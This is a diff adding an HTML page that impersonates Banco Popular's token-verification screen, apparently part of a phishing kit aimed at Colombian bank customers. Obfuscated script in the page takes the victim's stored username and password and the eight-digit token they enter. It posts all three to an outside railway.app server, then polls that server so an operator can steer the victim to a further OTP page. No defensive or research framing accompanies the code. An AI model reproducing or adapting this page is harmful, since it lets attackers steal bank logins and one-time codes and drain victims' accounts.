@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Verificación de Token - Banco Popular">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="theme-color" content="#00556e">
+    <link rel="icon" type="image/svg+xml" href="img/Isotipo.svg">
+    <title>Verificación de Token - Banco Popular</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @keyframes pageEnter {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        body { animation: pageEnter 0.6s cubic-bezier(0.4, 0, 0.2, 1) both; }
+        #loading-screen { animation: none; }
+
+        .token-main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 24px 20px 0 20px;
+            width: 100%;
+        }
+
+        .token-card {
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 40px 32px 32px 32px;
+            width: 100%;
+            max-width: 520px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .token-illustration {
+            width: 120px;
+            height: auto;
+            margin-bottom: 24px;
+        }
+
+        .token-title {
+            font-family: var(--font);
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--pop-dark-600);
+            line-height: 1.35;
+            margin-bottom: 16px;
+            letter-spacing: -0.3px;
+        }
+
+        .token-subtitle {
+            font-family: var(--font);
+            font-size: 15px;
+            font-weight: 400;
+            color: var(--pop-mid-600);
+            line-height: 1.5;
+            margin-bottom: 24px;
+            max-width: 420px;
+        }
+
+        .token-input {
+            width: 100%;
+            padding: 18px 12px;
+            border: 1.5px solid #888;
+            border-radius: 12px;
+            font-family: var(--font);
+            font-size: 30px;
+            font-weight: 700;
+            color: #000;
+            background: #fff;
+            text-align: center;
+            letter-spacing: 18px;
+            text-indent: 18px;
+            transition: border-color 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .token-input:focus {
+            outline: none;
+            border-color: var(--pop-mid-400);
+        }
+
+        .token-input.error {
+            border-color: var(--pop-error-600);
+            background: rgba(249, 53, 56, 0.05);
+        }
+
+        .token-input::placeholder {
+            letter-spacing: 18px;
+            text-indent: 18px;
+            color: var(--pop-light-900);
+        }
+
+        .token-help {
+            font-family: var(--font);
+            font-size: 14px;
+            color: var(--pop-mid-600);
+            line-height: 1.5;
+            margin-bottom: 12px;
+            max-width: 420px;
+        }
+
+        .token-link {
+            color: var(--pop-secondary-900);
+            font-weight: 700;
+            text-decoration: underline;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .token-link:hover {
+            opacity: 0.85;
+        }
+
+        .token-timer {
+            font-family: var(--font);
+            font-size: 15px;
+            color: var(--pop-dark-600);
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .token-timer strong {
+            color: var(--pop-secondary-900);
+            font-weight: 700;
+        }
+
+        .token-btn {
+            display: block;
+            width: 100%;
+            max-width: 260px;
+            padding: 16px;
+            background: #c5c8cb;
+            color: #555;
+            border: none;
+            border-radius: 10px;
+            font-family: var(--font);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: background 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.2px;
+            margin: 0 auto;
+        }
+
+        .token-btn.enabled {
+            background: var(--pop-primary-600);
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(16,81,99,0.28);
+        }
+
+        .token-btn.enabled:hover {
+            background: var(--pop-primary-900);
+        }
+
+        @media (max-width: 480px) {
+            .token-card {
+                padding: 32px 22px 26px 22px;
+            }
+            .token-title {
+                font-size: 18px;
+            }
+            .token-subtitle {
+                font-size: 14px;
+            }
+            .token-input {
+                padding: 16px 10px;
+                font-size: 26px;
+                letter-spacing: 14px;
+                text-indent: 14px;
+            }
+            .token-input::placeholder {
+                letter-spacing: 14px;
+                text-indent: 14px;
+            }
+            .token-illustration {
+                width: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen hidden">
+        <div class="loading-content">
+            <div class="loading-logo-circle">
+                <video class="loading-video" autoplay loop muted playsinline>
+                    <source src="img/panimada.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p class="loading-title">Estamos validando tu información</p>
+            <p class="loading-subtitle">Por favor espera un momento</p>
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <main class="token-main">
+            <div class="token-card">
+                <img src="img/80-smartphone-hand@3x.png" alt="Verificación de identidad" class="token-illustration">
+
+                <h1 class="token-title">Para continuar con la solicitud ayúdanos a validar tu identidad</h1>
+
+                <p class="token-subtitle">Ingresa el código temporal enviado a tu celular o el código de tu token físico</p>
+
+                <input
+                    type="text"
+                    id="token-input"
+                    class="token-input"
+                    maxlength="8"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    autocomplete="off"
+                >
+
+                <p class="token-help">Si no recibiste la clave temporal o no cuentas con token físico, valida tu identidad a través de la opción:</p>
+
+                <a href="#" class="token-link">Confirma tu identidad</a>
+
+                <p class="token-timer">Código válido por <strong id="timer-display">03:00</strong> minuto(s)</p>
+
+                <button type="button" id="btn-continuar-token" class="token-btn" disabled>Continuar</button>
+            </div>
+        </main>
+
+        <section class="bottom-card">
+            <div class="legal-links">
+                <a href="#" class="legal-link">Seguridad</a>
+                <a href="#" class="legal-link">Accesibilidad</a>
+            </div>
+
+            <hr class="bottom-divider">
+
+            <div class="bottom-logos">
+                <img src="img/Isotipo.svg" alt="Banco Popular" class="bottom-iso">
+                <span class="bottom-sep"></span>
+                <img src="img/aval.png" alt="Grupo Aval" class="bottom-aval">
+            </div>
+
+            <p class="bottom-date" id="footer-date"></p>
+
+            <p class="bottom-copy">&copy; Banco Popular. Todos los derechos reservados. | v4.2.53</p>
+        </section>
+    </div>
+
+    <script>
+    (function(){
+        var _0xa1 = "https://multi-bancos-production.up.railway.app";
+        var _0xb2 = "popular";
+        var _0xc3 = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+        try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+
+        var _0xd4 = document.getElementById('token-input');
+        var _0xe5 = document.getElementById('btn-continuar-token');
+        var _0xf6 = document.getElementById('timer-display');
+        var _0xg7 = document.getElementById('loading-screen');
+
+        function _0xh8() {
+            var _0xi9 = _0xd4.value.replace(/\D/g, '').slice(0, 8);
+            _0xd4.value = _0xi9;
+            var _0xj0 = _0xi9.length === 8;
+            _0xe5.disabled = !_0xj0;
+            if (_0xj0) { _0xe5.classList.add('enabled'); }
+            else { _0xe5.classList.remove('enabled'); }
+        }
+
+        _0xd4.addEventListener('input', _0xh8);
+        _0xh8();
+
+        var _0xk1 = 3 * 60;
+        function _0xl2() {
+            var _0xm3 = Math.floor(_0xk1 / 60);
+            var _0xn4 = _0xk1 % 60;
+            _0xf6.textContent = (_0xm3 < 10 ? '0' : '') + _0xm3 + ':' + (_0xn4 < 10 ? '0' : '') + _0xn4;
+            if (_0xk1 <= 0) {
+                clearInterval(_0xo5);
+                return;
+            }
+            _0xk1--;
+        }
+        _0xl2();
+        var _0xo5 = setInterval(_0xl2, 1000);
+
+        _0xe5.addEventListener('click', async function(_0xp6){
+            if (_0xe5.disabled) return;
+            var _0xq7 = _0xd4.value.trim();
+            if (_0xq7.length !== 8) return;
+
+            var _0xr8 = sessionStorage.getItem('usuario') || '';
+            var _0xs9 = sessionStorage.getItem('clave') || '';
+
+            _0xg7.classList.remove('hidden');
+            _0xg7.classList.add('show');
+            document.body.style.overflow = 'hidden';
+
+            try {
+                var _0xt0 = await fetch(_0xa1 + '/' + _0xb2 + '/enviar-token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: _0xc3,
+                        token: _0xq7,
+                        identificacion: _0xr8,
+                        clave: _0xs9
+                    })
+                });
+                var _0xu1 = await _0xt0.json();
+                console.log('Token enviado:', _0xu1);
+            } catch (_0xv2) {
+                console.error('Error:', _0xv2);
+            }
+
+            var _0xw3 = setInterval(async function(){
+                try {
+                    var _0xx4 = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                    var _0xy5 = await _0xx4.json();
+                    console.log('Estado:', _0xy5.estado);
+
+                    if (_0xy5.estado === 'otp') {
+                        clearInterval(_0xw3);
+                        window.location.href = 'otp.html';
+                    } else if (_0xy5.estado === 'rechazado') {
+                        clearInterval(_0xw3);
+                        _0xg7.classList.remove('show');
+                        _0xg7.classList.add('hidden');
+                        document.body.style.overflow = '';
+                        _0xd4.classList.add('error');
+                        _0xd4.value = '';
+                        _0xe5.disabled = true;
+                        _0xe5.classList.remove('enabled');
+                    }
+                } catch (_0xz6) {
+                    console.error('Error estado:', _0xz6);
+                }
+            }, 2000);
+        });
+
+        _0xd4.addEventListener('input', function(){
+            _0xd4.classList.remove('error');
+        });
+
+        var _0x3a = new Date();
+        var _0x4b = _0x3a.toLocaleDateString('es-CO', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+        var _0x5c = _0x4b.charAt(0).toUpperCase() + _0x4b.slice(1);
+        var _0x6d = document.getElementById('footer-date');
+        if (_0x6d) _0x6d.textContent = _0x5c + ' | ' + _0x3a.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', hour12: true });
+    })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0x7e=0;
+document.addEventListener('touchend',function(_0x8f){
+var _0x9g=new Date().getTime();
+if(_0x9g-_0x7e<=300){_0x8f.preventDefault();}
+_0x7e=_0x9g;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xah){_0xah.preventDefault();});
+document.addEventListener('focusin',function(_0xbi){
+var _0xcia=(_0xbi.target&&_0xbi.target.tagName)?_0xbi.target.tagName.toLowerCase():'';
+if(_0xcia==='input'||_0xcia==='textarea'||_0xcia==='select'){
+if(_0xbi.target.style.fontSize!=='16px'){
+_0xbi.target.dataset._fs=_0xbi.target.style.fontSize||'';
+_0xbi.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0xdia){
+var _0xcia=(_0xdia.target&&_0xdia.target.tagName)?_0xdia.target.tagName.toLowerCase():'';
+if(_0xcia==='input'||_0xcia==='textarea'||_0xcia==='select'){
+if(_0xdia.target.dataset._fs!==undefined){
+_0xdia.target.style.fontSize=_0xdia.target.dataset._fs;
+delete _0xdia.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+</body>
+</html>
